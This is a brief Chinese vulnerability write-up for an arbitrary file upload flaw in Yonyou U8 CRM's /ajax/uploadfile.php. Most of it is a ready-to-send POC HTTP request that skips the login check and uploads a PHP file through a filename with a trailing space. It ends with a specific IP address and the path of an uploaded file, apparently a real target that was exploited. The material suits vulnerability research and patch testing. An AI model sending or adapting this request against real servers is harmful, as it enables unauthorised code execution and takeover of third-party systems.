title="用友U8CRM"

**漏洞简述**

用友CRM系统客户关系管理的第一需求就是对客户资源的集中管理，即为客户资源的企业化管理,可以避免因业务调整或人员变动造成的客户资源流失和客户管理盲区的产生;更重要是可以基于客户状况来归集相关业务信息，通过完善的信息来支持业务角色的工作,同时达到对业务阶段和行动的监控指导。这也是CRM对企业带来的核心变化。其接口uploadfile.php存在任意文件上传漏洞，攻击者课通过该漏洞获取系统服务器权限。



**二、漏洞检测poc**

```yaml

POST /ajax/uploadfile.php?DontCheckLogin=1&vname=file HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
Content-Type: multipart/form-data;boundary=----230982304982309
Content-Length: 278

------230982304982309
Content-Disposition: form-data; name="file"; filename="test.php "
Content-Type: application/octet-stream

<?php echo "HelloWorldTest";unlink(__FILE__);?>
------230982304982309
Content-Disposition: form-data; name="upload"

upload
------230982304982309--
```

101.200.231.115:8072/tmpfile/updBEA8.tmp.php